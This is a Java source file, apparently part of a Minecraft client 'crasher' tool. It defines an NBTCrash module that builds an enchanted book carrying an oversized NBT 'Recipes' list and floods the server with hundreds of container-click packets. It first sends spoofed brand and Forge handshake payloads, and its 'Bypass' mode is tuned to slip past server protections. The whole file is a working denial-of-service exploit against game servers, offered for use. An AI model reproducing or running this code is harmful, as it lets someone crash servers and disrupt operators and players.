package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class NBTCrash extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private final Random random = new Random();
    private boolean enabled = false;
    private String mode = "Bypass";

    public NBTCrash() {
        super("NBTCrash", "NBT Crash using Enchanted Book with Recipes", true);
    }

    @Override
    public String getArgsUsage() {
        return "<mode>";
    }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Mode", OptionType.LIST, new String[]{"Low", "Medium", "Bypass"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.mode = values[0];
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null || mc.player.containerMenu == null) {
            msgHelper.sendMessage("&cNot ready!", true);
            return;
        }

        int packets, size;
        switch (mode) {
            case "Low" -> { packets = 300; size = 5000; }
            case "Medium" -> { packets = 500; size = 35000; }
            case "Bypass" -> { packets = 470; size = 22000; }
            default -> { packets = 470; size = 30000; }
        }

        sendLegitimatePayloads();
        msgHelper.sendMessage("&fSending &6" + packets + " &fpackets...", true);

        CompoundTag compound = new CompoundTag();
        ListTag list = new ListTag();
        for (int i = 0; i < size; i++) list.add(StringTag.valueOf("A"));
        compound.put("Recipes", list);

        ItemStack stack = new ItemStack(Items.ENCHANTED_BOOK, 1);
        stack.setTag(compound);

        int windowId = mc.player.containerMenu.containerId;
        for (int i = 0; i < packets; i++) {
            ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
                windowId, 0, getValidSlot(windowId), getValidButton(),
                getValidClickType(), stack, new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
            );
            mc.getConnection().send(packet);
        }
        msgHelper.sendMessage("&aNBTCrash completed!", true);
    }

    private void sendLegitimatePayloads() {
        String[] channels = {"minecraft:brand", "fml:handshake", "fml:hs"};
        for (String channel : channels) {
            try {
                io.netty.buffer.ByteBuf buffer = io.netty.buffer.Unpooled.buffer();
                net.minecraft.network.FriendlyByteBuf buf = new net.minecraft.network.FriendlyByteBuf(buffer);
                buf.writeUtf("{}");
                mc.getConnection().send(new net.minecraft.network.protocol.common.ServerboundCustomPayloadPacket(
                    new net.minecraft.resources.ResourceLocation(channel), buf
                ));
            } catch (Exception ignored) {}
        }
    }

    private int getValidSlot(int windowId) {
        return windowId == 0 ? random.nextInt(36) : random.nextInt(45);
    }

    private int getValidButton() {
        int[] buttons = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 40, 99};
        return buttons[random.nextInt(buttons.length)];
    }

    private ClickType getValidClickType() {
        ClickType[] types = {ClickType.PICKUP, ClickType.QUICK_MOVE, ClickType.SWAP, 
            ClickType.CLONE, ClickType.THROW, ClickType.QUICK_CRAFT, ClickType.PICKUP_ALL};
        return types[random.nextInt(types.length)];
    }

    @Override
    public boolean getEnabled() { return enabled; }

    @Override
    public void setEnabled(boolean bool) { this.enabled = bool; }
}
